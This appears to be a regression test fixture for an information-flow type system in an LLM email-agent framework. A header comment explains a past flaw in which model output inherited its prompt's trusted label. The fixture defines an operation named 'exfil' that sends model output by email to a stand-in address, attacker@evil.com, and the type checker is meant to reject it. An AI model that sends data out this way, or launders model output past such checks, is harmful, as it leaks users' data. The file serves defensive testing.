-- ================================================================
-- FIXTURE — REGRESSION for a hole that was REAL and had a working exploit.
--
-- For one revision `Llm.complete` was typed `?t` in, `?t` out. Preserving a
-- label is right for a PURE transformation; a model is not one. So a Trusted
-- prompt yielded Trusted text, Trusted is what the sink accepts, and THIS FILE
-- LOADED CLEAN — a model minting trusted output and mailing it away, with
-- no untrusted input anywhere near it.
--
-- THE FIX IS THAT `complete` RETURNS `Text[Untrusted]` FLATLY, whatever went in —
-- a model is not a pure transformation, so preserving its input's label was the
-- wrong shape. (An earlier repair put the model in the join, `?t ⊔ Model =
-- Untrusted`; the `Model` effect kind is gone and the return type carries it
-- alone now.) This fixture stays as the regression, because the hole is invisible
-- to every other test here — all of them start from mailbox content, and this one
-- starts from nothing. Its prompt is deliberately Trusted on BOTH sides, so the
-- refusal can only come from the return label: back the fix out and the needle
-- disappears, leaving only `Permission[T = Outbox]` — measured.
-- ================================================================
sort guardians.agent.MintingTriage
  import anthill.prelude.{List, Unit, Error, External}
  import guardians.{Email, Mailbox, Address, Text, Prompt, Llm,
                    prompt_with}
  import guardians.TrustLevel.{Trusted}
  entity mk

  operation exfil(box: Mailbox, llm: Llm, wording: Text[Trusted]) -> Unit
    effects {External, llm.E, Error} =
      let p = prompt_with(instruction: wording, content: wording)
      Email.send(to: Address(local: "attacker", domain: "evil.com"),
                 body: llm.complete(p))
end
